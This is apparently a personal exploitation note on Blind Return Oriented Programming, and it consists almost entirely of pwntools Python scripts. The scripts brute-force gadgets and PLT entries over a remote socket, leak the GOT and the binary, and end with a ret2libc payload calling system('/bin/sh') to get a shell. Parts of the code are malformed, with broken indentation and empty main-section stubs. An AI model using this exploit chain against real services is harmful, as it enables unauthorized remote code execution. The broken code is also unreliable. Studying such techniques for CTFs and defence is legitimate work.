# Blind Return Oriented Programming
<details>
    <summary>BROP (dont have the binary // PIE off)</summary>
        <div>


Steps of Exploitation:

Puts/Printf() when fd is 0,1,2 stdin,stdout,stderror
1. find a loop-gadget
2. find brop-gadget (the ret2csu popper-gadget // rdi & rsi controll)
3. find puts@plt
4. leak the binary

write() when fd is not 0,1,2 stdin,stdout,stderror (when we connect to the binary throu a socket)
1. find a loop-gadget
2. find brop-gadget (the ret2csu popper-gadget // rdi & rsi controll)
3. find strcmp@PLT (strcmp sets rdx to the number of matching chars) ### erklären wie strcmp funktioniert
4. find write@PLT (let us write to any fd)
5. leak the binary

### find loop-gadget
the example binary prints `Are you blind my friend?\n` and than asks us for input
so we know that when we find the right addr there should be a `Are you blind my friend?\n` printed back to us and we should be able to input again


```
def find_loop_gadget(i):
    
    r = remote(ip, port,timeout=1)
    
    addr_guess = i + 0x400200				          #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers
		
    payload = b'A'*88					              #pad
    payload += p64(addr_guess)				          #rip

    r.readuntil(b'Are you blind my friend?\n')		  #read the first (intendet) "Are you blind my friend?\n" 
    r.send(payload)


    try:
        check = r.recvline()					      #trys to read a line if cant read a line EOF error will be thrown
        if b'Are you blind my friend?\n' in check:	  #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr
            return int(addr_guess)				
        else:
            print(check)					          #if we recv something that is not 'Are you blind my friend?\n' we print to check what it was
            print(r.recvline())						  #than try to read more that should throw an EOF error if not inspect further
            r.close()
    except:
        print(sys.exc_info()[0])				      #prints the error
        print(i)						              #prints the iterator
        r.close()


for i in range(0x2000): 			                  #loop  0x400200 -> 0x402200	
    loop = find_loop_gadget(i)					
    if loop:							
        print(f'found loop_gadget @ {hex(loop)}')
        break							              #remove this break if you want to find more potential loop addr.
```



### find brop-gadget

ok we now have a loop-gadget now we need to find a brop-gadget (popper gadget from ret2csu)
6 pops in a row are pretty uncommon so its not hard to indentify it.


```
def find_brop_gadget(i):


    r = remote(ip, port,timeout=1)

    addr_guess = i + 0x400200                          #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers

    payload = b'A'*88						           #pad
    payload += p64(addr_guess)					       #rip 
    payload += p64(0x00)					           #setup stack
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(loop)					           #loop back to main

    r.recvuntil(b'Are you blind my friend?\n')		   #read the first (intendet) "Are you blind my friend?\n" 
    r.send(payload)

    try:
        check = r.recvline()					       #trys to read a line if cant read a line EOF error will be thrown
        if b'Are you blind my friend?\n' in check:	   #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr since our 6 pops goes throu
           							                   #2nd check if we are on the right gadget this time we want a crash
                p = remote(ip,port,timeout=1)

                payload = b'A'*88				       #pad
                payload += p64(addr_guess)			   #rip
                payload += p64(0x00)				   #setup stack
                payload += p64(0x00)	
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)         		   # one extra 0x00 to crash. ret to 0x00 is allways a crash  
		        payload += p64(loop)				   # if it still prints 'Are you blind my friend?\n' its the wrong guess addr
		
		        p.recvuntil(b'Are you blind my friend?\n')	   #read the first (intendet) "Are you blind my friend?\n" 
                p.send(payload)					
                
		        try:
               	    check2 = p.recvline()			   #try to read a line if we can read a line we are on the wrong addr guess #we should crash here
                    if check2: 					       #if we can recv something addr guess are wrong
                    print('not passed check2')
                    p.close()
                    r.close()

                except:						           #we want a crash so if we crash were good
                    r.close()
                    p.close()
                    return addr_guess

        else:							               #if we can recv something on the initial check but its not "Are you blind my friend?\n" or we hang
                r.close()					           #close connection
    except:							                   #if we crash during first payload wrong guess addr
        print(sys.exc_info()[0])
        r.close()


for i in range(0x2000):                                #loop  0x400200 -> 0x402200 
    brop = find_brop_gadget(i)
    if brop:
        print(f'found brop_gadget @ {hex(brop)}')
        break                                          #remove this break if you want to find more potential brop-gadget addr.
    

pop_rdi = int(brop) + 0x9                              #we need this later 
pop_rsi_r15 = int(brop) + 0x7                          #we need this later

```

```
def find_puts(i):                        #puts@plt  we will find puts@plt later with a bit of understanding ELF headers


    r = remote(ip, port,timeout=1)
                                                #iterate in steps of 0x10
    addr_guess = i*0x10 + 0x400200              #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers 



            #this is the plt layout we want to find
            # 0x0000000000400560  puts@plt
            # 0x0000000000400570  setbuf@plt
            # 0x0000000000400580  read@plt
            # 0x0000000000400590  __libc_start_main@plt
            # 0x00000000004005a0  strcmp@plt


    payload = b'A'*88                           #pad
    payload += p64(pop_rdi)                     #first argument for # int puts( char const * string ); puts(rdi) 
    payload += p64(0x400000)                    #points to 0x400000 which should print out 'ELF'
    payload += p64(addr_guess)                  #the addr guess for puts@plt

    r.recvuntil('Are you blind my friend?\n')   #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)
    


    try:
        check = r.recvline()                    #trys to recv if cant recv anything EOF error
        if b'ELF' in check:                     #if the str 'ELF' is in the check we found a potential puts@plt addr.
            r.close()
            return addr_guess
        else:
            print(check)                        #debugging if something weard was printed
    except:
        print(sys.exc_info()[0])                #printes the error
        print(i)                                #prints the iterator
        r.close()

for i in range(0x50):                           # loop 0x400200 -> 0x400700  ## 0x400200 + 0x50*0x10 = 0x400200 + 0x500 = 0x400700
    puts = find_puts(i)
    if puts:
        print(f'found puts @ {hex(puts)}')
        break                                   #remove this break if you want to find more potential puts@plt addr.
```

```
def find_strcmp(i):
    
    r = remote(ip, port,timeout=1)
                                                #iterate in steps of 0x10 same as finding puts
    addr_guess = i*0x10 + 0x400200                    #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers

    payload = b'A'*88                           #pad
    payload += p64(pop_rdi)                     #pop 1st argument for # int strcmp (const char* str1, const char* str2); strcmp(rdi,rsi)
    payload += p64(0x400000)                    #holds valide pointer to 'ELF'          GOOD
    payload += p64(pop_rsi_r15)                 #pop 2nd argument   
    payload += p64(0x400000)                    #holds valide pointer to 'ELF'          GOOD
    payload += p64(0x00)                        #junk to fill r15
    payload += p64(addr_guess)                  #the addr guess for strcmp@plt
    payload += p64(loop)                        #loop back to main if check forGOOD:GOOD pointers work 
    r.recvuntil('Are you blind my friend?\n')   #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)
    

    try:
        check = r.recvline()                                            #trys to recv if cant recv anything EOF error
        if b'Are you blind my friend?\n' in check:                      #if we can find 'Are you blind my friend?\n' we passed check1 
            r.close()
            print('\n1st check passed good:good')
            
            print(f'2nd check for {hex(addr_guess)} good:bad')
            p = remote(ip,port,timeout=1)

            payload = b'A'*88                                           #same as above but with GOOD:BAD pointers that should crash
            payload += p64(pop_rdi) 
            payload += p64(0x400000)                                    #holds valide pointer to 'ELF'          GOOD
            payload += p64(pop_rsi_r15)
            payload += p64(0x0)                                         #holds invalide pointer to 0x00         BAD
            payload += p64(0x0)
            payload += p64(addr_guess)
            payload += p64(loop)        
            p.readuntil('Are you blind my friend?\n')
            p.send(payload)
                
            try:
                check2 = p.recvline()

                if check2: 
                    print('not passed check2')
                    p.close()
                else:
                    print('not passed check2')
                    p.close()

            except:
                r.close()
                p.close()
                print(f'3nd check for {hex(addr_guess)} bad:good')
                p = remote(ip,port,timeout=1)

                payload = b'A'*88                                       #same as above but with BAD:GOOD pointers that should crash    
                payload += p64(pop_rdi)
                payload += p64(0x0)                                     #holds invalide pointer to 0x00         BAD
                payload += p64(pop_rsi_r15)
                payload += p64(0x400000)                                #holds valide pointer to 'ELF'          GOOD
                payload += p64(0x0)
                payload += p64(addr_guess)
                payload += p64(loop)         
                p.readuntil('Are you blind my friend?\n')
                p.send(payload)

                try:
                    check3 = p.recvline()

                    if check3: 
                        print('not passed check3')
                        p.close()
                    else:
                        print('not passed check3')
                        p.close()

                except:
                    p.close()
                    print(f'4rd check for {hex(addr_guess)} bad:bad')
                    p = remote(ip,port,timeout=1)

                    payload = b'A'*88                                   #same as above but with BAD:BAD pointers that should crash
                    payload += p64(pop_rdi) 
                    payload += p64(0x0)                                 #holds invalide pointer to 0x00         BAD
                    payload += p64(pop_rsi_r15)
                    payload += p64(0x0)                                 #holds invalide pointer to 0x00         BAD
                    payload += p64(0x0)             
                    payload += p64(addr_guess)
                    payload += p64(loop)         
                    p.readuntil('Are you blind my friend?\n')
                    p.send(payload)
                    try:
                        check4 = p.recvline()

                        if check4: 
                            print('not passed check4')
                            p.close()

                        else:
                            print('not passed check4')
                            p.close()


                    except:
                        p.close()
                        print(sys.exc_info()[0])
                        return addr_guess                               #if all checks were good we return the guess_addr

        else:
            r.close()
    except:
        print(sys.exc_info()[0])
        print(hex(addr_guess))
        r.close()


for i in range(0x50):                                                   # loop 0x400200 -> 0x400700  ## 0x400200 + 0x50*0x10 = 0x400200 + 0x500 = 0x400700
        strcmp = find_strcmp(i)
        if strcmp:
            print(f'found strcmp @ {hex(strcmp)}')
            break                                                       #remove this break if you want to find more potential strcmp@plt addr.

 ```

now comes a tricky part when you dont know where the GOT lives
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/brop_find_got/ghidra-sort.png">
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/brop_find_got/start_of_binary.png">
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/brop_find_got/PT_DYNAMIC.png">
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/brop_find_got/ptr_dynamic.png">
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/brop_find_got/PLTGOT.png">
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/brop_find_got/GOT_start.png">



 ```           

def leak(i):        #simple leak function to find libc 


    r = remote(ip, port,timeout=1)


    payload = b'A'*88                                                   
    payload += p64(pop_rdi)
    payload += p64(i)
    payload += p64(puts)


    r.send(payload)
    r.recvline()
    leak = unpack(r.recvline()[:-1],'all')
    return leak



puts_check = hex(libc.symbols['puts'])[-2::]

for i in range(0x10):
    check = leak(0x601000+i*8)                          #found 0x601060 using 0x601000 cause page start allways scan full ranges
    print(f'{hex(0x601000+i*8)} : {hex(check)}')
    if hex(check)[12:] == puts_check:
        putsgot = (i*8+0x601000)
        print(f'puts_got @ {hex(putsgot)}')
        break


```

```
def leak_binary(i,j):


    r = remote(ip, port,timeout=1)
    

    rb = lambda x :r.recvb(x)
    rl = lambda : r.recvline()
    ru = lambda x :r.recvuntil(x)
    rlub = lambda x :r.recvuntilb(x)
    s = lambda x :r.send(x)
    sl = lambda x : r.sendline(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    inter = lambda : r.interactive()

    x = i + j

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(x)
    payload += p64(puts)


    s(payload)


    rl()
    try:
        check = rl()
        if check:
            if check.hex()[:-2] == '':
                file.append(b'\x00')
                r.close()
                return int(offset) + 1

            else:
                file.append(check[:-1])
                last_len = int(len(check)-1)
                r.close()
                return int(offset) + int(last_len)


                
            
        else:
            r.close()
    except:
        print(sys.exc_info()[0])
        r.close()
        return int(offset + 1)

```

```
def pwn():

    #context.log_level = 'debug'

    r = remote(ip, port,timeout=1)
    

    rb = lambda x :r.recvb(x)
    rl = lambda : r.recvline()
    ru = lambda x :r.recvuntil(x)
    rlub = lambda x :r.recvuntilb(x)
    s = lambda x :r.send(x)
    sl = lambda x : r.sendline(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    inter = lambda : r.interactive()



    pop_rdi = int(brop) + 0x9
    ret = int(brop) + 10

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(putsgot)
    payload += p64(puts+0x10)
    payload += p64(loop)
 

    ru('Are you blind my friend?\n')
    s(payload)


    leak = unpack(rl()[:-1],'all')
    print(hex(leak))
    libc.address = leak - libc.symbols['puts']

    print(hex(libc.address))

    ru('Are you blind my friend?\n')

    binsh = next(libc.search(b'/bin/sh\x00'))
    execve = libc.symbols['execve']
    system = libc.symbols['system']

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)

    s(payload)



    inter()


if __name__ == '__main__':

    
    print('now searching for brop_gadget')




    print('now searching for puts')                 #maybe printf will be a false true it works for most things but care when something crashes it could be this


            

    print('now searching for strcmp')




    
    # file = []
    # last_len = 0
    # offset = 0

    # for i in range(0xb00):
    #     offset = leak_binary(offset,0x400000)
    #     print(offset)
    #     print(f'{hex(i)}')


    # string1 = b''.join(file)

    # with open('binary_dump', 'wb') as out:
    #     out.write(string1)
    #     out.close()

    pwn()          #pops a shell

</div>
</details>
